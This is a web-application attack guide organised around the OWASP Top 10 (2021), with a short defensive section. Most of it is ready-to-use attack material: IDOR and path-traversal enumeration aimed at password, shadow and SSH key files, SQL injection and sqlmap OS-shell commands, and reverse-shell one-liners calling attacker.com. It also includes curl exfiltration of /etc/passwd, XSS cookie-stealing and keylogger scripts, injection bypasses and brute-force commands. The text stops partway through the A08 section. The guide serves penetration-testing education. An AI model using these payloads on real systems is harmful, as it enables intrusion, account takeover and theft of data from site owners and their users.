# OWASP Top 10 Web Application Vulnerabilities - Complete Guide

## OWASP Top 10 (2021)

1. **A01:2021 - Broken Access Control** ⚠️ CRITICAL
2. **A02:2021 - Cryptographic Failures** 🔐
3. **A03:2021 - Injection** 💉
4. **A04:2021 - Insecure Design** 🏗️
5. **A05:2021 - Security Misconfiguration** ⚙️
6. **A06:2021 - Vulnerable and Outdated Components** 📦
7. **A07:2021 - Identification and Authentication Failures** 🔑
8. **A08:2021 - Software and Data Integrity Failures** 📝
9. **A09:2021 - Security Logging and Monitoring Failures** 📊
10. **A10:2021 - Server-Side Request Forgery (SSRF)** 🌐

**Key Changes from 2017:**
- Broken Access Control moved from #5 to #1
- Cryptographic Failures (previously Sensitive Data Exposure)
- Insecure Design is a new category
- Security Logging and Monitoring Failures moved up
- SSRF added as a new category

---

## A01:2021 - Broken Access Control ⚠️ CRITICAL

### 📋 Description
Broken Access Control remains the #1 vulnerability in 2025. Users can access resources or perform actions outside their intended permissions. With the rise of microservices, APIs, and cloud-native applications, access control failures have become more complex and prevalent.

### 🎯 Real-World Impact
- **2023 MOVEit Breach**: Exploited access control flaws, affecting 2,000+ organizations
- **2021 T-Mobile Breach**: IDOR vulnerability exposed 37 million customer records
- **2021 Microsoft Power Apps**: Misconfigured access controls exposed 38 million records

### 🔍 Common Vulnerabilities

#### **1. Insecure Direct Object References (IDOR)**

**Basic IDOR Examples:**
```bash
# User profile access
http://target.com/api/user/123/profile
http://target.com/api/user/124/profile  # Try sequential IDs

# Document access
http://target.com/api/documents/abc123
http://target.com/api/documents/abc124  # Increment document IDs

# Order information
http://target.com/orders/12345
http://target.com/orders/12346  # Access other orders

# File downloads
http://target.com/download?file=invoice_123.pdf
http://target.com/download?file=invoice_124.pdf
```

**Advanced IDOR Techniques:**
```bash
# UUID/GUID enumeration (not truly random)
http://target.com/api/user/550e8400-e29b-41d4-a716-446655440000
# Use UUID prediction tools or leaked UUIDs from other endpoints

# Base64 encoded IDs
http://target.com/api/user/MTIz  # Decode: 123
http://target.com/api/user/MTI0  # Encode 124 to Base64: MTI0

# Hash-based IDs (MD5/SHA1 of sequential numbers)
http://target.com/api/user/202cb962ac59075b964b07152d234b70  # MD5 of "123"
# Generate MD5 hashes of sequential numbers

# Composite keys
http://target.com/api/data?userId=123&documentId=456
# Change both parameters: userId=124&documentId=456

# GraphQL IDOR
POST /graphql
{
  "query": "{ user(id: 123) { email, ssn, creditCard } }"
}
# Try: { user(id: 124) { email, ssn, creditCard } }

# REST API with multiple ID formats
GET /api/v1/users/123/orders/456
GET /api/v1/users/124/orders/456  # Access other user's orders
GET /api/v1/users/123/orders/457  # Access other orders

# Mobile API endpoints (often less protected)
http://target.com/mobile/api/user/123/settings
http://target.com/mobile/api/user/124/settings
```

**Real-World IDOR Scenario:**
```bash
# E-commerce platform vulnerability
# Step 1: Create account and place order
POST /api/orders
{"items": [{"id": 1, "qty": 1}], "userId": 1001}
Response: {"orderId": "ORD-2023-001", "userId": 1001}

# Step 2: Access your order
GET /api/orders/ORD-2023-001
Response: {"orderId": "ORD-2023-001", "userId": 1001, "total": 99.99, "address": "..."}

# Step 3: Enumerate other orders
GET /api/orders/ORD-2023-002  # ✓ Access granted!
GET /api/orders/ORD-2023-003  # ✓ Access granted!

# Step 4: Modify other user's order
PUT /api/orders/ORD-2023-002
{"address": "attacker's address", "status": "shipped"}

# Step 5: Cancel competitor's orders (business logic attack)
DELETE /api/orders/ORD-2023-003
DELETE /api/orders/ORD-2023-004
```

**IDOR Testing Methodology:**
```bash
# 1. Create two test accounts
Account A: user_a@test.com (ID: 100)
Account B: user_b@test.com (ID: 101)

# 2. Perform action with Account A, capture request
POST /api/profile/100/update
Cookie: session=account_a_token
{"bio": "Account A bio"}

# 3. Replay request with Account B's session, but Account A's ID
POST /api/profile/100/update
Cookie: session=account_b_token  # Account B's session
{"bio": "Account B modified Account A"}  # Can we modify A's profile?

# 4. Test all HTTP methods
GET /api/profile/100     # Read
POST /api/profile/100    # Create
PUT /api/profile/100     # Update
PATCH /api/profile/100   # Partial update
DELETE /api/profile/100  # Delete

# 5. Test with missing authentication
GET /api/profile/100
# No Cookie or Authorization header

# 6. Test with expired/invalid tokens
GET /api/profile/100
Cookie: session=expired_or_invalid_token
```

**Automated IDOR Testing:**
```bash
# Burp Suite Autorize Extension
# 1. Configure low-privilege user session
# 2. Browse as high-privilege user
# 3. Autorize replays all requests with low-priv session
# 4. Highlights authorization bypasses

# Custom Python script
import requests

def test_idor(base_url, endpoint, id_range, session_token):
    for user_id in range(id_range[0], id_range[1]):
        url = f"{base_url}{endpoint}{user_id}"
        headers = {"Authorization": f"Bearer {session_token}"}
        
        response = requests.get(url, headers=headers)
        
        if response.status_code == 200:
            print(f"[+] IDOR Found: {url}")
            print(f"    Data: {response.json()}")
        elif response.status_code == 403:
            print(f"[-] Forbidden: {url}")
        else:
            print(f"[?] Status {response.status_code}: {url}")

# Usage
test_idor(
    "https://target.com",
    "/api/users/",
    (1, 1000),
    "your_session_token_here"
)
```

#### **2. Path Traversal / Directory Traversal**

**Basic Path Traversal:**
```bash
# Linux/Unix systems
http://target.com/download?file=../../../../etc/passwd
http://target.com/download?file=../../../../etc/shadow
http://target.com/download?file=../../../../root/.ssh/id_rsa
http://target.com/download?file=../../../../var/log/apache2/access.log

# Windows systems
http://target.com/download?file=..\..\..\..\windows\system32\config\sam
http://target.com/download?file=..\..\..\..\windows\system32\config\system
http://target.com/download?file=C:\windows\win.ini
http://target.com/download?file=..\..\..\..\Users\Administrator\.ssh\id_rsa
```

**Advanced Encoding Techniques:**
```bash
# URL encoding
http://target.com/download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double URL encoding
http://target.com/download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd

# UTF-8 encoding
http://target.com/download?file=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd

# 16-bit Unicode encoding
http://target.com/download?file=..%u2216..%u2216etc%u2216passwd

# Mixed encoding
http://target.com/download?file=..%2f..%5c..%2fetc/passwd

# Overlong UTF-8 encoding
http://target.com/download?file=..%c0%2f..%c0%2f..%c0%2fetc%c0%2fpasswd
```

**Bypass Techniques:**
```bash
# Null byte injection (older systems)
http://target.com/download?file=../../../../etc/passwd%00.pdf

# Absolute path
http://target.com/download?file=/etc/passwd
http://target.com/download?file=C:\windows\win.ini

# Path truncation (Windows, 256 char limit)
http://target.com/download?file=../../../../etc/passwd[add 256+ chars]

# Nested traversal sequences
http://target.com/download?file=....//....//....//etc/passwd
http://target.com/download?file=..;/..;/..;/etc/passwd

# UNC paths (Windows)
http://target.com/download?file=\\attacker.com\share\malicious.exe

# Case variation (Windows)
http://target.com/download?file=..\..\..\..\WiNdOwS\sYsTeM32\config\sam

# Stripped traversal bypass
# If app removes "../" once
http://target.com/download?file=....//....//....//etc/passwd
# After removal: ../../../../etc/passwd
```

**Real-World Path Traversal Scenario:**
```bash
# Vulnerable image viewer application
# Normal usage:
http://target.com/view-image?img=profile_pics/user123.jpg

# Attack sequence:
# 1. Test basic traversal
http://target.com/view-image?img=../../../etc/passwd
Response: "Invalid file path"

# 2. Try URL encoding
http://target.com/view-image?img=..%2f..%2f..%2fetc%2fpasswd
Response: "Invalid file path"

# 3. Try nested traversal
http://target.com/view-image?img=....//....//....//etc/passwd
Response: 200 OK
Content: root:x:0:0:root:/root:/bin/bash...

# 4. Extract sensitive files
http://target.com/view-image?img=....//....//....//etc/shadow
http://target.com/view-image?img=....//....//....//home/user/.ssh/id_rsa
http://target.com/view-image?img=....//....//....//var/www/html/config.php

# 5. Access application source code
http://target.com/view-image?img=....//....//....//var/www/html/index.php
http://target.com/view-image?img=....//....//....//var/www/html/admin/login.php

# 6. Read log files for reconnaissance
http://target.com/view-image?img=....//....//....//var/log/apache2/access.log
http://target.com/view-image?img=....//....//....//var/log/mysql/error.log
```

**Cloud-Specific Path Traversal:**
```bash
# AWS metadata access
http://target.com/download?file=../../../../proc/self/environ
# Look for AWS credentials in environment variables

# Docker container escape
http://target.com/download?file=../../../../proc/self/cgroup
http://target.com/download?file=../../../../proc/self/mountinfo

# Kubernetes secrets
http://target.com/download?file=../../../../var/run/secrets/kubernetes.io/serviceaccount/token

# Azure metadata
http://target.com/download?file=../../../../mnt/azure/credentials

# GCP metadata
http://target.com/download?file=../../../../var/run/secrets/cloud.google.com/service-account.json
```

**Automated Path Traversal Testing:**
```bash
# DotDotPwn
dotdotpwn -m http -h target.com -x 80 -f /etc/passwd -k "root:" -d 5

# Wfuzz
wfuzz -c -z file,/usr/share/wordlists/dirtraversal.txt \
  http://target.com/download?file=FUZZ

# Custom Python fuzzer
import requests

payloads = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/etc/passwd",
    "C:\\windows\\win.ini"
]

for payload in payloads:
    url = f"http://target.com/download?file={payload}"
    response = requests.get(url)
    
    if "root:" in response.text or "[extensions]" in response.text:
        print(f"[+] Vulnerable: {payload}")
        print(f"    Response: {response.text[:200]}")
```

#### **3. Missing Function Level Access Control**

**Basic Function-Level Bypass:**
```bash
# Access admin functions as regular user
POST /api/admin/deleteUser
POST /api/admin/createUser
GET /admin/dashboard
GET /api/admin/reports
DELETE /api/admin/logs

# Common admin endpoints to test
GET /admin
GET /administrator
GET /admin.php
GET /admin/index.php
GET /admin/dashboard
GET /api/admin/*
GET /api/v1/admin/*
POST /api/admin/users
DELETE /api/admin/users/123
```

**HTTP Method Manipulation:**
```bash
# Original request (allowed)
GET /api/user/123
Response: 200 OK {"id": 123, "name": "John"}

# Try other methods (may not be protected)
POST /api/user/123
PUT /api/user/123
PATCH /api/user/123
DELETE /api/user/123  # ✓ Deletes user!
OPTIONS /api/user/123
HEAD /api/user/123

# HTTP verb tampering
GET /api/user/123 → X-HTTP-Method-Override: DELETE
POST /api/user/123 → X-HTTP-Method-Override: DELETE
```

**Real-World Function-Level Attack:**
```bash
# Social media platform vulnerability
# Regular user can only view posts
GET /api/posts/123
Response: 200 OK

# Test admin functions
GET /api/admin/posts/123/analytics
Response: 200 OK  # ✓ Should be 403!
{
  "views": 50000,
  "clicks": 5000,
  "revenue": 250.00,
  "user_ips": ["1.2.3.4", "5.6.7.8"]
}

# Test moderation functions
POST /api/admin/posts/123/feature
Response: 200 OK  # ✓ Post featured on homepage!

DELETE /api/admin/posts/456
Response: 200 OK  # ✓ Deleted competitor's post!

# Test user management
GET /api/admin/users
Response: 200 OK  # ✓ Full user database!

POST /api/admin/users/789/ban
Response: 200 OK  # ✓ Banned competitor!
```

#### **4. Horizontal Privilege Escalation**

**User ID Manipulation:**
```bash
# Change password for other users
POST /api/changePassword
{"userId": 123, "newPassword": "hacked123"}  # Your ID
{"userId": 124, "newPassword": "hacked124"}  # Other user's ID

# Access other user's private data
GET /api/user/123/private-messages
GET /api/user/124/private-messages  # Other user's messages

# Modify other user's settings
PUT /api/user/123/settings
{"email": "your@email.com"}
PUT /api/user/124/settings
{"email": "attacker@evil.com"}  # Hijack account
```

**Cookie/Token Manipulation:**
```bash
# JWT token manipulation
# Original token payload:
{
  "userId": 123,
  "username": "john",
  "role": "user"
}

# Modify userId in JWT (if not properly signed)
{
  "userId": 124,  # Changed
  "username": "john",
  "role": "user"
}

# Cookie manipulation
Cookie: userId=123; sessionId=abc123
Cookie: userId=124; sessionId=abc123  # Try other user's ID

# Session fixation
Cookie: PHPSESSID=attacker_controlled_session
```

**Real-World Horizontal Escalation:**
```bash
# Banking application vulnerability
# Step 1: Login as User A (Account: 1001)
POST /api/login
{"username": "userA", "password": "pass"}
Response: {"token": "eyJ...", "accountId": 1001}

# Step 2: View your balance
GET /api/accounts/1001/balance
Authorization: Bearer eyJ...
Response: {"balance": 5000.00}

# Step 3: Try accessing other accounts
GET /api/accounts/1002/balance
Authorization: Bearer eyJ...
Response: {"balance": 50000.00}  # ✓ Accessed!

# Step 4: Transfer money from other account
POST /api/accounts/1002/transfer
Authorization: Bearer eyJ...
{
  "toAccount": 1001,
  "amount": 10000.00
}
Response: {"success": true}  # ✓ Money transferred!
```

#### **5. Vertical Privilege Escalation**

**Parameter Injection:**
```bash
# Registration with admin flag
POST /api/register
{
  "username": "attacker",
  "password": "pass123",
  "email": "attacker@evil.com",
  "isAdmin": true,  # Add admin parameter
  "role": "admin",
  "privileges": ["admin", "superuser"]
}

# Mass assignment vulnerability
POST /api/user/profile
{
  "bio": "Hello",
  "role": "admin",  # Inject role parameter
  "isVerified": true,
  "credits": 999999
}
```

**Role Manipulation:**
```bash
# Modify role in request
PUT /api/user/123/profile
{
  "name": "John",
  "role": "admin"  # Change from "user" to "admin"
}

# JWT role manipulation (if weak secret)
# Original JWT payload:
{
  "userId": 123,
  "role": "user"
}

# Modified JWT payload:
{
  "userId": 123,
  "role": "admin"  # Changed
}

# Re-sign with weak/leaked secret
# Use jwt_tool or similar
```

**GraphQL Privilege Escalation:**
```bash
# Query admin-only fields
POST /graphql
{
  "query": "{ users { id name email role adminNotes ssn } }"
}

# Mutation to elevate privileges
POST /graphql
{
  "mutation": "updateUser(id: 123, role: ADMIN) { id role }"
}

# Introspection to find hidden fields
POST /graphql
{
  "query": "{ __schema { types { name fields { name } } } }"
}
```

**Real-World Vertical Escalation:**
```bash
# E-learning platform vulnerability
# Step 1: Register as student
POST /api/register
{
  "username": "student",
  "password": "pass",
  "email": "student@test.com"
}

# Step 2: Discover hidden parameters via error messages
PUT /api/user/profile
{"bio": "test", "invalid_param": "test"}
Response: {
  "error": "Invalid parameters",
  "allowed": ["bio", "avatar", "role", "isInstructor"]
}

# Step 3: Elevate to instructor
PUT /api/user/profile
{
  "bio": "I'm an instructor now",
  "role": "instructor",
  "isInstructor": true
}
Response: {"success": true}

# Step 4: Access instructor functions
GET /api/instructor/students
Response: [/* All student data */]

POST /api/instructor/grades
{
  "studentId": 456,
  "courseId": 789,
  "grade": "A+"
}
Response: {"success": true}

# Step 5: Elevate to admin
PUT /api/user/profile
{"role": "admin"}

GET /api/admin/users
Response: [/* All users with passwords */]
```

### 🛠️ Testing Tools & Methodologies

**Burp Suite Extensions:**
```bash
# Autorize - Test authorization across different roles
# 1. Install Autorize extension
# 2. Configure low-privilege user session
# 3. Browse as high-privilege user
# 4. Autorize replays requests with low-priv session
# 5. Review results for authorization bypasses

# AuthMatrix - Test access control matrix
# 1. Define users and roles
# 2. Define endpoints
# 3. Run matrix test
# 4. Visualize access control gaps

# InQL - GraphQL security testing
# 1. Introspection query
# 2. Identify sensitive fields
# 3. Test authorization on queries/mutations
```

**OWASP ZAP:**
```bash
# Access Control Testing
zap-cli quick-scan -s all http://target.com

# Active scan with access control rules
zap-cli active-scan -r http://target.com

# Custom scripts for access control testing
# ZAP → Tools → Scripts → Load Script
```

**Custom Testing Scripts:**
```bash
# Python access control tester
import requests
import json

class AccessControlTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.endpoints = []
        
    def test_horizontal_escalation(self, user1_token, user2_token, user1_id, user2_id):
        """Test if user1 can access user2's resources"""
        test_endpoints = [
            f"/api/user/{user2_id}/profile",
            f"/api/user/{user2_id}/orders",
            f"/api/user/{user2_id}/messages"
        ]
        
        for endpoint in test_endpoints:
            url = self.base_url + endpoint
            headers = {"Authorization": f"Bearer {user1_token}"}
            
            response = requests.get(url, headers=headers)
            
            if response.status_code == 200:
                print(f"[!] HORIZONTAL ESCALATION: {endpoint}")
                print(f"    User1 accessed User2's resource")
            elif response.status_code == 403:
                print(f"[✓] Protected: {endpoint}")
                
    def test_vertical_escalation(self, user_token):
        """Test if regular user can access admin functions"""
        admin_endpoints = [
            "/api/admin/users",
            "/api/admin/dashboard",
            "/api/admin/settings",
            "/admin/panel"
        ]
        
        for endpoint in admin_endpoints:
            url = self.base_url + endpoint
            headers = {"Authorization": f"Bearer {user_token}"}
            
            response = requests.get(url, headers=headers)
            
            if response.status_code == 200:
                print(f"[!] VERTICAL ESCALATION: {endpoint}")
                print(f"    Regular user accessed admin function")
            elif response.status_code == 403:
                print(f"[✓] Protected: {endpoint}")
                
    def test_idor(self, token, resource_type, id_range):
        """Test IDOR vulnerabilities"""
        for resource_id in range(id_range[0], id_range[1]):
            url = f"{self.base_url}/api/{resource_type}/{resource_id}"
            headers = {"Authorization": f"Bearer {token}"}
            
            response = requests.get(url, headers=headers)
            
            if response.status_code == 200:
                print(f"[+] Accessible: {url}")
                
# Usage
tester = AccessControlTester("https://target.com")
tester.test_horizontal_escalation(
    user1_token="token1",
    user2_token="token2",
    user1_id=123,
    user2_id=124
)
```

### 🛡️ Defense Mechanisms

**Secure Access Control Implementation:**
```python
# Python/Flask example with proper access control
from functools import wraps
from flask import request, jsonify

def require_auth(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        token = request.headers.get('Authorization')
        if not token:
            return jsonify({"error": "No token provided"}), 401
        
        user = verify_token(token)
        if not user:
            return jsonify({"error": "Invalid token"}), 401
            
        return f(user, *args, **kwargs)
    return decorated_function

def require_ownership(f):
    @wraps(f)
    def decorated_function(user, *args, **kwargs):
        resource_id = kwargs.get('resource_id')
        resource = get_resource(resource_id)
        
        # Check ownership
        if resource.owner_id != user.id:
            return jsonify({"error": "Access denied"}), 403
            
        return f(user, *args, **kwargs)
    return decorated_function

def require_role(required_role):
    def decorator(f):
        @wraps(f)
        def decorated_function(user, *args, **kwargs):
            if user.role != required_role:
                return jsonify({"error": "Insufficient privileges"}), 403
            return f(user, *args, **kwargs)
        return decorated_function
    return decorator

# Usage
@app.route('/api/user/<int:resource_id>/profile', methods=['GET'])
@require_auth
@require_ownership
def get_profile(user, resource_id):
    # User can only access their own profile
    return jsonify(get_user_profile(resource_id))

@app.route('/api/admin/users', methods=['GET'])
@require_auth
@require_role('admin')
def get_all_users(user):
    # Only admins can access
    return jsonify(get_users())
```

**Key Principles:**
```bash
# 1. Deny by default
# 2. Enforce access control on server-side
# 3. Use indirect object references (map IDs)
# 4. Implement proper session management
# 5. Log all access control failures
# 6. Use attribute-based access control (ABAC)
# 7. Implement rate limiting
# 8. Regular security audits
```

---

## A02:2021 - Cryptographic Failures

### Description
Failures related to cryptography leading to exposure of sensitive data.

### Common Issues

**1. Weak Encryption**
```bash
# Check for weak SSL/TLS
sslscan target.com
testssl.sh target.com
nmap --script ssl-enum-ciphers -p 443 target.com

# Look for:
- SSLv2, SSLv3, TLS 1.0, TLS 1.1
- Weak ciphers (RC4, DES, 3DES)
- No Perfect Forward Secrecy
```

**2. Sensitive Data Exposure**
```bash
# Check for exposed sensitive files
http://target.com/.git/
http://target.com/.env
http://target.com/config.php
http://target.com/database.yml
http://target.com/.aws/credentials
http://target.com/id_rsa

# API keys in JavaScript
curl http://target.com/main.js | grep -i "api_key\|apikey\|api-key"

# Hardcoded credentials
curl http://target.com/config.js | grep -i "password\|secret\|token"
```

**3. Insecure Storage**
```bash
# Check for plaintext passwords in database
# Check for reversible encryption
# Check for weak hashing (MD5, SHA1)

# Password storage should use:
- bcrypt
- scrypt
- Argon2
- PBKDF2
```

---

## A03:2021 - Injection

### 1. SQL Injection

**Detection:**
```bash
# Error-based
' OR '1'='1
" OR "1"="1
' OR '1'='1' --
' OR '1'='1' #
' OR '1'='1'/*

# Boolean-based
' AND 1=1--
' AND 1=2--

# Time-based
' OR SLEEP(5)--
' OR pg_sleep(5)--
'; WAITFOR DELAY '00:00:05'--
```

**Exploitation:**
```bash
# Union-based
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

# Extract database name
' UNION SELECT database()--
' UNION SELECT schema_name FROM information_schema.schemata--

# Extract table names
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--

# Extract column names
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--

# Extract data
' UNION SELECT username,password FROM users--
```

**SQLMap Automation:**
```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1"

# POST request
sqlmap -u "http://target.com/login" --data="username=admin&password=pass"

# Cookie-based
sqlmap -u "http://target.com/page" --cookie="PHPSESSID=abc123"

# Dump database
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D database_name --tables
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump

# OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell

# File read
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"
```

### 2. Command Injection

**Detection:**
```bash
# Basic payloads
; whoami
| whoami
|| whoami
& whoami
&& whoami
` whoami `
$( whoami )

# URL encoded
%3B%20whoami
%7C%20whoami
```

**Exploitation:**
```bash
# Reverse shell
; bash -i >& /dev/tcp/attacker.com/4444 0>&1
; nc attacker.com 4444 -e /bin/bash
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Data exfiltration
; curl http://attacker.com/$(cat /etc/passwd | base64)
; wget http://attacker.com/$(whoami)
```

**Bypass Techniques:**
```bash
# Space bypass
{cat,/etc/passwd}
cat</etc/passwd
cat$IFS/etc/passwd
cat${IFS}/etc/passwd

# Keyword filtering bypass
c''at /etc/passwd
c\at /etc/passwd
c"a"t /etc/passwd
/bin/cat /etc/passwd
/???/??t /etc/passwd

# Newline injection
%0a whoami
%0d whoami
```

### 3. Cross-Site Scripting (XSS)

**Reflected XSS:**
```html
<!-- Basic payloads -->
<script>alert(1)</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">

<!-- Event handlers -->
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>

<!-- Bypass filters -->
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror="alert(1)">
<img src=x onerror='alert(1)'>
<img src=x onerror=`alert(1)`>
<svg><script>alert(1)</script></svg>
```

**Stored XSS:**
```html
<!-- Profile/comment injection -->
<script>
fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>

<!-- Keylogger -->
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/log?key=' + e.key);
}
</script>

<!-- Session hijacking -->
<script>
new Image().src='http://attacker.com/steal?cookie='+document.cookie;
</script>
```

**DOM-based XSS:**
```javascript
// Vulnerable code
var search = location.search.substring(1);
document.write(search);

// Exploit
http://target.com/page?search=<script>alert(1)</script>

// innerHTML injection
document.getElementById('output').innerHTML = location.hash.substring(1);
// Exploit: http://target.com/page#<img src=x onerror=alert(1)>
```

**XSS Bypass Techniques:**
```html
<!-- Case variation -->
<ScRiPt>alert(1)</sCrIpT>

<!-- Encoding -->
<script>alert(&#49;)</script>
<script>alert(\u0031)</script>
<script>alert(\x31)</script>

<!-- Tag breaking -->
"><script>alert(1)</script>
'><script>alert(1)</script>

<!-- Filter bypass -->
<svg/onload=alert(1)>
<img src=x onerror=alert(1)//
<script>alert(1)<!--
<script>alert(1)//
```

### 4. LDAP Injection

**Basic Payloads:**
```bash
# Authentication bypass
*
*)(&
*))%00
admin)(&)
admin)(!(&(objectClass=*))

# Data extraction
*)(uid=*))(|(uid=*
*)(objectClass=*))(|(objectClass=*
```

### 5. XPath Injection

**Basic Payloads:**
```bash
# Authentication bypass
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y

# Data extraction
' or 1=1]/user/password | a[' or '1'='1
```

### 6. NoSQL Injection

**MongoDB:**
```javascript
// Authentication bypass
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

// Data extraction
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ab"}}
```

**URL Encoded:**
```bash
username[$ne]=null&password[$ne]=null
username[$gt]=&password[$gt]=
username[$regex]=.*&password[$regex]=.*
```

---

## A04:2021 - Insecure Design

### Description
Missing or ineffective security controls in the design phase.

### Common Issues

**1. Lack of Rate Limiting**
```bash
# Brute force attacks
for i in {1..10000}; do
  curl -X POST http://target.com/login \
    -d "username=admin&password=pass$i"
done

# Account enumeration
for user in $(cat usernames.txt); do
  curl -X POST http://target.com/forgot-password \
    -d "email=$user@target.com"
done
```

**2. Missing Security Requirements**
```bash
# No MFA implementation
# No account lockout
# No CAPTCHA on sensitive forms
# No session timeout
# No IP whitelisting for admin panel
```

**3. Insufficient Input Validation**
```bash
# Accept any file type
# No size limits
# No content validation
# No sanitization
```

**4. Business Logic Flaws**
```bash
# Negative quantity
POST /checkout
{"item": "laptop", "quantity": -1, "price": 1000}

# Price manipulation
POST /checkout
{"item": "laptop", "quantity": 1, "price": 1}

# Workflow bypass
# Skip payment step
# Skip verification step
```

---

## A05:2021 - Security Misconfiguration

### Description
Insecure default configurations, incomplete setups, or verbose error messages.

### Common Misconfigurations

**1. Default Credentials**
```bash
# Common defaults
admin:admin
admin:password
root:root
administrator:administrator
admin:123456

# Database defaults
mysql: root:(blank)
postgres: postgres:postgres
mongodb: (no auth)
```

**2. Directory Listing**
```bash
# Check for directory listing
http://target.com/uploads/
http://target.com/images/
http://target.com/backup/
http://target.com/admin/
```

**3. Verbose Error Messages**
```bash
# SQL errors revealing database structure
# Stack traces revealing file paths
# Debug information in production
# Version information disclosure
```

**4. Unnecessary Services**
```bash
# Scan for open ports
nmap -sV -p- target.com

# Check for unnecessary services
- FTP (21)
- Telnet (23)
- SMTP (25)
- DNS (53)
- TFTP (69)
```

**5. Missing Security Headers**
```bash
# Check headers
curl -I http://target.com

# Missing headers:
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000
Content-Security-Policy: default-src 'self'
Referrer-Policy: no-referrer
Permissions-Policy: geolocation=(), microphone=()
```

**6. Exposed Configuration Files**
```bash
# Common exposed files
http://target.com/.git/config
http://target.com/.env
http://target.com/web.config
http://target.com/phpinfo.php
http://target.com/.htaccess
http://target.com/composer.json
http://target.com/package.json
http://target.com/.DS_Store
http://target.com/Dockerfile
http://target.com/.dockerignore
```

**7. CORS Misconfiguration**
```bash
# Test CORS
curl -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: X-Requested-With" \
  -X OPTIONS http://target.com/api/data

# Vulnerable response:
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

---

## A06:2021 - Vulnerable and Outdated Components

### Description
Using components with known vulnerabilities.

### Detection Methods

**1. Version Detection**
```bash
# Wappalyzer
# BuiltWith
# WhatWeb
whatweb http://target.com

# Nmap scripts
nmap -sV --script=http-enum target.com

# Manual inspection
curl -I http://target.com | grep -i "server\|x-powered-by"
```

**2. Dependency Scanning**
```bash
# Node.js
npm audit
npm audit fix

# Python
pip-audit
safety check

# Ruby
bundle audit

# Java
dependency-check.sh --project myapp --scan ./

# PHP
composer audit
```

**3. Known Vulnerabilities**
```bash
# Search CVE databases
# Check exploit-db
searchsploit apache 2.4.49

# Check for specific vulnerabilities
# Log4Shell (CVE-2021-44228)
# Spring4Shell (CVE-2022-22965)
# Apache Struts (CVE-2017-5638)
```

**4. Outdated CMS/Frameworks**
```bash
# WordPress
http://target.com/readme.html
wpscan --url http://target.com

# Joomla
http://target.com/administrator/manifests/files/joomla.xml
joomscan -u http://target.com

# Drupal
http://target.com/CHANGELOG.txt
droopescan scan drupal -u http://target.com
```

---

## A07:2021 - Identification and Authentication Failures

### Description
Broken authentication mechanisms allowing attackers to compromise accounts.

### Common Vulnerabilities

**1. Weak Password Policy**
```bash
# Test weak passwords
admin:admin
admin:password
admin:123456
user:user
test:test
```

**2. Credential Stuffing**
```bash
# Using leaked credentials
# Combo lists from breaches
# Automated tools
python3 credstuffer.py -u http://target.com/login -c combos.txt
```

**3. Brute Force**
```bash
# Hydra
hydra -l admin -P passwords.txt http-post-form \
  "http://target.com/login:username=^USER^&password=^PASS^:Invalid"

# Burp Intruder
# Set payload positions
# Load password list
# Start attack

# Custom script
for pass in $(cat passwords.txt); do
  curl -X POST http://target.com/login \
    -d "username=admin&password=$pass" \
    -c cookies.txt
done
```

**4. Session Fixation**
```bash
# Attacker gets session ID
http://target.com/login?sessionid=attacker_controlled

# Victim logs in with that session ID
# Attacker uses the same session ID
```

**5. Session Hijacking**
```bash
# XSS to steal cookies
<script>
fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>

# Network sniffing (if no HTTPS)
wireshark
tcpdump -i eth0 -A | grep -i "cookie\|session"
```

**6. Weak Session Management**
```bash
# Predictable session IDs
Cookie: sessionid=1
Cookie: sessionid=2
Cookie: sessionid=3

# No session expiration
# Session doesn't invalidate on logout
# Session reuse after password change
```

**7. Missing MFA**
```bash
# No second factor
# Bypassable MFA
# MFA only on login, not on sensitive actions
```

**8. Password Reset Flaws**
```bash
# Token in URL (referer leakage)
# Predictable tokens
# No token expiration
# Token reuse
# Host header injection
POST /reset-password HTTP/1.1
Host: attacker.com
```

---

## A08:2021 - Software and Data Integrity Failures

### Description
Code and infrastructure that doesn't protect against integrity violations.

### Common Issues

**1. Insecure Deserialization**
```bash
# See Advanced Attacks section for detailed payloads
# Java: ysoserial
# Python: pickle exploits
# PHP: unserialize() exploits
```

**2. Unsigned/Unverified Updates**
```bash
# Man-in-the-middle attacks on updates
# No signature verification
# HTTP instead of HTTPS for updates
# No integrity checks (checksums)
```

**3. CI/CD Pipeline Vulnerabilities**
```bash
# Exposed .git directory
wget -r http://target.com/.git/
